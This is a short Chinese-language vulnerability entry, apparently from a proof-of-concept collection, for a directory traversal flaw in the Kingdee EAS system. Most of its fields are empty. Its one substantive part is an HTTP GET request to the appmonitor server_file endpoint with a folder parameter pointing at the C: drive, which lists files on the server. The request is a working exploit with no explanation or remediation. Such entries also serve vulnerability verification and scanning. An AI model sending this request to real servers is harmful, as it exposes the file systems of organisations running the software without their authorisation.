﻿# 金蝶 EAS 系统存在目录遍历漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /appmonitor/protected/selector/server_file/files?folder=C:%5C%5C&suffix= HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：金蝶 EAS 系统存在目录遍历漏洞.poc
